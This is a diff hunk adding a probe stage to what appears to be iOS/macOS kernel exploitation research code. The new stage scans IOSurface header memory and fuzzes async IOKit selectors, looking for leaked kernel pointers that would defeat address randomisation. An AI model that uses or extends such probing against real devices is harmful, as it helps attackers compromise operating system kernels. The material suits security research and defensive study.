@@ -18353,6 +18353,175 @@ new_modes:
             rlog("*** Probe complete ***\n");
             goto done;
         }
+        if (rounds == 244) {
+            rlog("*** rounds=244: Async IOKit + IOSurface header deep scan ***\n");
+            
+            io_service_t svc244 = IOServiceGetMatchingService(kIOMasterPortDefault,
+                IOServiceMatching("IOSurfaceRoot"));
+            io_connect_t conn244 = 0;
+            kern_return_t kr244 = IOServiceOpen(svc244, mach_task_self(), 0, &conn244);
+            
+            /* Create multiple IOSurfaces of different sizes */
+            /* The idea: different sizes may cause the kernel to lay out
+             * the shared mapping differently, potentially exposing header data */
+            int sizes[] = {64, 256, 4096, 16384, 65536, 262144};
+            for (int si = 0; si < 6; si++) {
+                CFMutableDictionaryRef p = CFDictionaryCreateMutable(NULL, 0,
+                    &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+                int w=4, h=4, bpr=16, pf=0x42475241;
+                int as = sizes[si];
+                CFNumberRef wr = CFNumberCreate(NULL, kCFNumberIntType, &w);
+                CFNumberRef hr = CFNumberCreate(NULL, kCFNumberIntType, &h);
+                CFNumberRef br = CFNumberCreate(NULL, kCFNumberIntType, &bpr);
+                CFNumberRef ar = CFNumberCreate(NULL, kCFNumberIntType, &as);
+                CFNumberRef fr = CFNumberCreate(NULL, kCFNumberIntType, &pf);
+                CFDictionarySetValue(p, CFSTR("IOSurfaceWidth"), wr);
+                CFDictionarySetValue(p, CFSTR("IOSurfaceHeight"), hr);
+                CFDictionarySetValue(p, CFSTR("IOSurfaceBytesPerRow"), br);
+                CFDictionarySetValue(p, CFSTR("IOSurfaceAllocSize"), ar);
+                CFDictionarySetValue(p, CFSTR("IOSurfacePixelFormat"), fr);
+                
+                /* Add IOSurfaceIsGlobal=true to see if that changes mapping */
+                int glob = 1;
+                CFNumberRef gr = CFNumberCreate(NULL, kCFNumberIntType, &glob);
+                CFDictionarySetValue(p, CFSTR("IOSurfaceIsGlobal"), gr);
+                
+                IOSurfaceRef s = IOSurfaceCreate(p);
+                if (s) {
+                    IOSurfaceLock(s, 0, NULL);
+                    void *base = IOSurfaceGetBaseAddress(s);
+                    size_t actual = IOSurfaceGetAllocSize(s);
+                    uint32_t sid = IOSurfaceGetID(s);
+                    
+                    rlog("  surf size=%d: id=%u base=%p actual=%zu\n", sizes[si], sid, base, actual);
+                    
+                    /* Scan read-only header pages (tag=88) before base */
+                    /* Use mach_vm_region_recurse to find the mapping start */
+                    mach_vm_address_t raddr = (mach_vm_address_t)base - 0x10000;
+                    mach_vm_address_t mapping_start = 0;
+                    while (raddr < (mach_vm_address_t)base) {
+                        mach_vm_size_t rsize = 0;
+                        natural_t depth = 1;
+                        struct vm_region_submap_info_64 rinfo;
+                        mach_msg_type_number_t rcnt = VM_REGION_SUBMAP_INFO_COUNT_64;
+                        kr244 = mach_vm_region_recurse(mach_task_self(), &raddr, &rsize, &depth,
+                            (vm_region_recurse_info_t)&rinfo, &rcnt);
+                        if (kr244 != 0) break;
+                        if (rinfo.user_tag == 88 && rinfo.protection == 1) {
+                            mapping_start = raddr;
+                        }
+                        raddr += rsize;
+                    }
+                    
+                    if (mapping_start && mapping_start < (mach_vm_address_t)base) {
+                        size_t hdr_size = (mach_vm_address_t)base - mapping_start;
+                        rlog("    Header pages: 0x%llx-%llx (%zu bytes)\n",
+                             (unsigned long long)mapping_start,
+                             (unsigned long long)base, hdr_size);
+                        
+                        /* Deep scan header for ANY pointer-like values */
+                        vm_offset_t data = 0;
+                        mach_msg_type_number_t dataCnt = 0;
+                        kr244 = mach_vm_read(mach_task_self(), mapping_start, 
+                            hdr_size > 65536 ? 65536 : hdr_size, &data, &dataCnt);
+                        if (kr244 == 0) {
+                            uint64_t *dp = (uint64_t*)data;
+                            int total_qw = dataCnt / 8;
+                            rlog("    Scanning %d qwords in header:\n", total_qw);
+                            
+                            /* Look for various kernel address ranges */
+                            for (int j = 0; j < total_qw; j++) {
+                                uint64_t v = dp[j];
+                                if (v == 0) continue;
+                                
+                                /* Kernel text: 0xFFFFFFF000000000+ */
+                                if ((v & 0xFFFFFF0000000000ULL) == 0xFFFFFFF000000000ULL) {
+                                    rlog("    +%d: 0x%016llx KTEXT\n", j*8, v);
+                                }
+                                /* Kernel heap/zone (tagged): 0xFFFFFF80xxxxxxxx */
+                                else if ((v >> 32) == 0xFFFFFF80ULL) {
+                                    rlog("    +%d: 0x%016llx KHEAP\n", j*8, v);
+                                }
+                                /* Physical addr (DART IOVA): 0x0-0x800000000 range with alignment */
+                                else if (v > 0x100000 && v < 0x800000000ULL && (v & 0xFFF) == 0) {
+                                    rlog("    +%d: 0x%016llx PHYS?\n", j*8, v);
+                                }
+                            }
+                            mach_vm_deallocate(mach_task_self(), data, dataCnt);
+                        }
+                    }
+                    
+                    IOSurfaceUnlock(s, 0, NULL);
+                    CFRelease(s);
+                }
+                CFRelease(p); CFRelease(wr); CFRelease(hr);
+                CFRelease(br); CFRelease(ar); CFRelease(fr); CFRelease(gr);
+            }
+            
+            /* Probe IOSurface client port notification for addresses */
+            rlog("\n  === IOSurface Async Notification Probe ===\n");
+            {
+                /* Create a notification port */
+                mach_port_t notify_port;
+                kr244 = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &notify_port);
+                
+                /* Set notification on the IOSurface connection */
+                io_connect_t conn244b = 0;
+                IOServiceOpen(svc244, mach_task_self(), 0, &conn244b);
+                
+                /* Register async notification on the port */
+                uint64_t ref[8] = {0};
+                uint64_t out[16] = {0};
+                uint32_t ocnt = 16;
+                
+                /* Try IOConnectCallAsyncScalarMethod with various selectors */
+                for (uint32_t sel = 0; sel < 20; sel++) {
+                    uint64_t in[4] = {0};
+                    ocnt = 16;
+                    memset(out, 0, sizeof(out));
+                    kr244 = IOConnectCallAsyncScalarMethod(conn244b, sel,
+                        notify_port, ref, 1, in, 1, out, &ocnt);
+                    if (kr244 == 0 && ocnt > 0) {
+                        rlog("  async sel%u: ok outcnt=%u", sel, ocnt);
+                        for (uint32_t j = 0; j < ocnt && j < 8; j++) {
+                            rlog(" [%u]=0x%llx", j, out[j]);
+                            if ((out[j] & 0xFFFFFF0000000000ULL) == 0xFFFFFFF000000000ULL)
+                                rlog("***KPTR***");
+                        }
+                        rlog("\n");
+                    }
+                }
+                
+                /* Check for any pending notifications */
+                struct {
+                    mach_msg_header_t hdr;
+                    char body[4096];
+                } nmsg;
+                memset(&nmsg, 0, sizeof(nmsg));
+                kr244 = mach_msg(&nmsg.hdr, MACH_RCV_MSG | MACH_RCV_TIMEOUT,
+                    0, sizeof(nmsg), notify_port, 100, MACH_PORT_NULL);
+                if (kr244 == 0) {
+                    rlog("  Got notification! size=%u id=0x%x\n", nmsg.hdr.msgh_size, nmsg.hdr.msgh_id);
+                    uint64_t *np = (uint64_t*)&nmsg;
+                    for (int j = 0; j < nmsg.hdr.msgh_size/8 + 4; j++) {
+                        if ((np[j] & 0xFFFFFF0000000000ULL) == 0xFFFFFFF000000000ULL) {
+                            rlog("    KPTR at +%d: 0x%016llx\n", j*8, np[j]);
+                        }
+                    }
+                } else {
+                    rlog("  No notification received (kr=0x%x)\n", kr244);
+                }
+                
+                IOServiceClose(conn244b);
+                mach_port_deallocate(mach_task_self(), notify_port);
+            }
+            
+            if (svc244) IOObjectRelease(svc244);
+            if (conn244) IOServiceClose(conn244);
+            
+            rlog("*** Probe complete ***\n");
+            goto done;
+        }
         if (rounds >= 170 && rounds != 219 && rounds != 225) {
             rlog("*** rounds=%d: fast-path to Phase 17 ***\n", rounds);
             goto phase16_done;
